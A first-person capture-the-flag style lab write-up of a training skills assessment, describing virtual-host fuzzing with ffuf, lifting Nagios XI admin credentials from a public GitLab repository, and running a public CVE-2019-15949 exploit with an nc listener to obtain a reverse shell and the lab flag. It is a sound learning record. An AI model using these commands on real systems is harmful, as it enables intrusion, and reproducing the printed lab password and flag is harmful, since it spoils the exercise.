# Nagios XI Authenticated Remote Code Execution under Attacking Common Applications - Skills Assessment II 

I began this assessment by performing a full port scan using nmap to identify any open services on the target machine. 
The initial scan revealed only a single service: a web server running on port 80. With this limited exposure, I turned my focus to web-based enumeration.

Visiting the IP in a browser displayed a default placeholder page, giving no immediate indication of the underlying technology or functionality. 
Suspecting the presence of virtual hosts, I ran a ffuf scan against the web server using the Host header to fuzz for subdomains. The command used was:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.inlanefreight.local" -u http://10.129.201.90 -fs 4242
```
This technique led to the discovery of three virtual hosts: `blog.inlanefreight.local`, `gitlab.inlanefreight.local`, and `monitoring.inlanefreight.local`. 
I updated my `/etc/hosts` file accordingly to resolve these domains to the target IP.

The `blog.inlanefreight.local` domain presented a WordPress site. A quick inspection of the page source and URL structure confirmed the use of WordPress through paths such as `/wp-content/` and `/wp-includes/`. 
Although enumeration with tools like wpscan was a possible next step, I chose instead to explore the other two subdomains first for any potentially more immediate attack vectors.

Navigating to `gitlab.inlanefreight.local`, I encountered an accessible GitLab instance that allowed registration and browsing of public repositories. 
I registered a user account and explored a project named “virtualhost,” which contained application configuration files. Inside the repository, I discovered hardcoded credentials and references to backend services such as a PostgreSQL database. 
One critical piece of information was a set of administrator credentials for what appeared to be the monitoring system.

Using these credentials, I logged into monitoring.inlanefreight.local, which was identified as a Nagios XI installation. Based on its interface and layout, 
I recognized it as a version potentially vulnerable to a known authenticated remote code execution vulnerability, **CVE-2019-15949**. I confirmed that the version and endpoint paths matched the exploit's requirements

With the Nagios admin credentials in hand, I downloaded a public exploit for CVE-2019-15949 and set up a listener on my attacker machine using `nc`:
```bash
nc -lvnp 8081
```
![image](https://github.com/user-attachments/assets/0c6340bb-dea9-431e-96e5-c66fc76d26f2)

I then executed the Python exploit, configured with the target URL, Nagios credentials, and my listener details:
```bash
python3 exploit.py \
  -t 'http://monitoring.inlanefreight.local' \
  -b /nagiosxi/ \
  -u nagiosadmin \
  -p 'oilaKglm7M09@CPL&^lC' \
  -lh 10.10.14.64 \
  -lp 8081
```

![image](https://github.com/user-attachments/assets/eb967440-3fdc-40e9-88cd-a1caaf7a9e35)

Once triggered, the exploit successfully delivered a reverse shell, and I received a connection back as the `nagios` user on the `skills2` system. I stabilized the shell and began enumeration of the file system.

![image](https://github.com/user-attachments/assets/f851bdb3-fd70-4467-bad9-1b05c6a3d40e)


Searching for the flag, I navigated to the web server’s admin directory and located a file named `f5088a862528cbb16b4e253f1809882c_flag.txt` under `/usr/local/nagiosxi/html/admin/`. I used the `cat` command to read its contents and retrieved the final flag:
`afe377683dce373ec2bf7eaf1e0107eb`.

This assessment reinforced the importance of thorough reconnaissance, especially when web services appear limited or non-interactive. Virtual host enumeration turned out to be the key that unlocked the entire attack chain, eventually leading to a successful exploitation of an authenticated RCE vulnerability in Nagios XI.

**Source:** 
Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE): https://www.exploit-db.com/exploits/52138
